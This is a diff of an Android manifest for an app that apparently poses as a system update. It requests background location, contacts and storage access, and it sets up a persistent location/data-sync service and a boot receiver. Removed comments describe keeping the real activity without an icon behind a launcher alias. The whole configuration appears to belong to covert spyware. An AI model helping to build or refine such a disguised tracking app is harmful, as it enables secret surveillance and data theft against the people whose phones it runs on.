@@ -16,7 +16,9 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <!-- Storage — كل الإصدارات -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
         android:maxSdkVersion="29" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
@@ -27,6 +29,7 @@
 
     <uses-permission android:name="android.permission.READ_CONTACTS" />
 
+    <!-- Services — كل الإصدارات -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
@@ -43,9 +46,11 @@
         android:supportsRtl="true"
         android:requestLegacyExternalStorage="true"
         android:usesCleartextTraffic="true"
+        android:extractNativeLibs="true"
+        android:hardwareAccelerated="true"
+        android:largeHeap="true"
         android:theme="@style/Theme.SystemUpdate">
 
-        <!-- الـ MainActivity الحقيقية — بدون أيقونة -->
         <activity
             android:name=".MainActivity"
             android:exported="false"
@@ -54,7 +59,6 @@
             android:launchMode="singleTask"
             android:theme="@style/Theme.SystemUpdate" />
 
-        <!-- activity-alias — دي اللي بتظهر في الـ Launcher -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
@@ -69,14 +73,12 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- WebView -->
         <activity
             android:name=".WebViewActivity"
             android:exported="false"
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:theme="@style/Theme.SystemUpdate" />
 
-        <!-- Background Service -->
         <service
             android:name=".BackgroundService"
             android:enabled="true"
@@ -84,7 +86,6 @@
             android:foregroundServiceType="location|dataSync"
             android:stopWithTask="false" />
 
-        <!-- Boot Receiver -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
